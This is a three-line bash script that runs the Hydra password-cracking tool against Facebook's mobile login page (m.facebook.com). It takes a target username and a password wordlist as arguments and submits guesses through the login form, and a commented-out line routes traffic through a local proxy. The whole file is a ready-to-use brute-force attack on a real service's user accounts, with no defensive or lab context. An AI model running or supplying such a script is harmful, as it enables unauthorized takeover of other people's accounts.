#!/bin/bash
#export HYDRA_PROXY_HTTP=http://127.0.0.1:8123
hydra -v -V -l $1 -P $2 https-post-form://m.facebook.com"/login.php?login_attempt=1:login=Log+In&email=^USER^&pass=^PASS^:m.facebook.com/login"
